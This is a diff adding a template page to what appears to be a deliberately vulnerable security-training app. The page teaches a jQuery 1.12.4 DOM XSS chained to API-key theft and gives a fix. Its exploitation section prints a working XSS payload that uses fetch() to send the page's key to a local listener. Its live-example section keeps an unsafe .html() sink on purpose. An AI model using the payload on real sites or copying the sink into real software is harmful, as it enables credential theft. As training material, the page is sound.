@@ -1,0 +1,92 @@
+{% extends "core/example_page_base.html" %}
+{% set example_title = "jQuery DOM XSS Chained to Session Token Theft" %}
+{% set example_difficulty = "Hard" %}
+{% set code_language = "html" %}
+{% block title %}{{ example_title }} — A06{% endblock %}
+
+{% block explanation %}
+<p>
+  This "Account" page reuses the same comment-preview widget from the
+  "jQuery DOM XSS" example — the same vendored, vulnerable jQuery 1.12.4,
+  the same flawed <code>htmlPrefilter</code>, the same <code>.html()</code>
+  call. The only difference here is what's worth stealing: this page also
+  displays your API key directly in the DOM, right next to the vulnerable
+  preview widget.
+</p>
+{% endblock %}
+
+{% block detect %}
+<p>
+  Same detection as the "jQuery DOM XSS" example — the vulnerability is
+  identical. What changes here is the consequence: a real attacker doesn't
+  stop at proving a script can run, they use that script execution to
+  grab whatever's valuable on the page.
+</p>
+{% endblock %}
+
+{% block exploitation %}
+<p>
+  First, start a listener to act as the attacker's collector, in a
+  separate terminal:
+</p>
+<pre><code class="language-bash">python3 -m http.server 9000</code></pre>
+<p>Then paste this exact payload into the comment box and click Preview:</p>
+<pre><code class="language-html">&lt;style&gt;&lt;style /&gt;&lt;img src=1 onerror="fetch('http://127.0.0.1:9000/collect?key=' + encodeURIComponent(document.getElementById('api-key-value').innerText))"&gt;</code></pre>
+<p>
+  Watch the terminal running <code>python3 -m http.server 9000</code> —
+  its access log shows a real GET request for
+  <code>/collect?key=sk_live_...</code>, carrying your API key, sent by
+  your own browser to a completely different process, with no further
+  interaction from you. The same DOM-XSS bug from the "jQuery DOM XSS"
+  example, now demonstrated at real-world severity: this is exactly how
+  a stored or reflected version of this bug would exfiltrate a real
+  session token or API credential to an attacker who never touched your
+  browser directly.
+</p>
+{% endblock %}
+
+{% block vulnerable_code %}&lt;div id="account-panel"&gt;
+  &lt;p&gt;Your API Key: &lt;span id="api-key-value"&gt;sk_live_4f8a2c91b3d7e0f6a1c5&lt;/span&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+$('#preview-btn').on('click', function () {
+  var raw = $('#comment-input').val();
+  // VULNERABLE: same flawed jQuery htmlPrefilter as the Medium-tier
+  // example, but now this page also has a real secret worth stealing
+  // sitting in the DOM right next to it.
+  $('#comment-preview').html(raw);
+});
+&lt;/script&gt;
+{% endblock %}
+
+{% block secure_code %}&lt;!-- Never render a real secret directly into client-reachable markup.
+     If a partial value must be shown, truncate it server-side before
+     ever sending it to the browser: --&gt;
+&lt;p&gt;Your API Key ends in: &lt;span&gt;...c5c5&lt;/span&gt;&lt;/p&gt;
+&lt;!-- PLUS the same jQuery fix as the Medium-tier example: upgrade past
+     3.5.0, and never trust a library to sanitize untrusted HTML alone. --&gt;
+{% endblock %}
+
+{% block live_example %}
+<div id="account-panel" class="mb-3">
+  <p>Your API Key: <span id="api-key-value">sk_live_4f8a2c91b3d7e0f6a1c5</span></p>
+</div>
+<p>Try it:</p>
+<div class="mb-2">
+  <textarea id="comment-input" class="form-control" rows="3" placeholder="Type your comment..."></textarea>
+</div>
+<button type="button" id="preview-btn" class="btn btn-primary mb-2">Preview</button>
+<div id="comment-preview" class="border rounded p-2 bg-body-secondary"></div>
+
+<script src="{{ url_for('static', filename='vendor/jquery-vulnerable/jquery-1.12.4.js') }}"></script>
+<script>
+  $('#preview-btn').on('click', function () {
+    var raw = $('#comment-input').val();
+    // VULNERABLE: same flawed jQuery htmlPrefilter as the Medium-tier
+    // example, but now this page also has a real secret worth stealing
+    // sitting in the DOM right next to it.
+    $('#comment-preview').html(raw);
+  });
+</script>
+{% endblock %}
